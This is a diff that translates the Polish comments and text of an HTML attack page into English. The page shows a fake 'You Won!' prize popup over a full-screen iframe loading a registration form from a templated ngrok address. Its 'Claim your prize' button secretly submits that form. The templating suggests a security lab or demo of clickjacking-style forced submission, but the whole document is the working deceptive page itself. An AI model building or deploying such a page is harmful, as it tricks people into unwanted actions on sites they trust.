@@ -2,9 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Wygrałeś!</title>
+    <title>You Won!</title>
     <style>
-        /* iframe zajmuje cały ekran i jest widoczny */
+        /* iframe occupies the full screen and is visible */
         iframe {
             position: absolute;
             top: 0;
@@ -15,7 +15,7 @@
             z-index: 1;
         }
 
-        /* Styl dla okna "Wygrałeś!" z obrysem */
+        /* Style for the "You Won!" popup with an outline */
         .popup {
             position: absolute;
             top: 50%;
@@ -24,15 +24,15 @@
             width: 300px;
             padding: 20px;
             background-color: white;
-            border: 2px solid #333; /* Ciemnoszary obrys */
-            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+            border: 2px solid #333; /* Dark gray outline */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             border-radius: 8px;
             text-align: center;
             font-family: Arial, sans-serif;
             z-index: 2;
         }
 
-        /* Styl nagłówka */
+        /* Header style */
         .popup .message {
             font-size: 1.5em;
             font-weight: bold;
@@ -40,7 +40,7 @@
             margin-bottom: 15px;
         }
 
-        /* Styl przycisku */
+        /* Button style */
         .popup .fake-button {
             padding: 10px 20px;
             font-size: 1.2em;
@@ -54,23 +54,23 @@
 </head>
 <body>
 
-<!-- Osadzenie formularza rejestracyjnego w iframe -->
-<iframe id="targetFrame" src="{{ ngrok_url }}/register_html" frameborder="0"></iframe>
+<!-- Embedding the registration form in an iframe -->
+<iframe id="targetFrame" src="{{ ngrok_url }}/register_html"></iframe>
 
-<!-- Popup z fałszywym komunikatem i przyciskiem na środku ekranu -->
+<!-- Popup with a fake message and a button in the middle of the screen -->
 <div class="popup">
-    <div class="message">Wygrałeś!</div> <!-- Fałszywy nagłówek -->
-    <button class="fake-button" onclick="claimPrize()">Odbierz nagrodę</button> <!-- Fałszywy przycisk -->
+    <div class="message">You Won!</div> <!-- False headline -->
+    <button class="fake-button" onclick="claimPrize()">Claim your prize</button> <!-- False button -->
 </div>
 
 <script>
-    // Funkcja do przesłania formularza w iframe po kliknięciu fałszywego przycisku
+    // Function to submit a form in an iframe after clicking a fake button
     function claimPrize() {
         const iframe = document.getElementById('targetFrame');
         try {
             iframe.contentWindow.document.getElementById('registerForm').submit();
         } catch (error) {
-            console.error("Brak dostępu do zawartości iframe z powodu polityki bezpieczeństwa.");
+            console.error("Access to iframe content denied due to security policy.");
         }
     }
 </script>
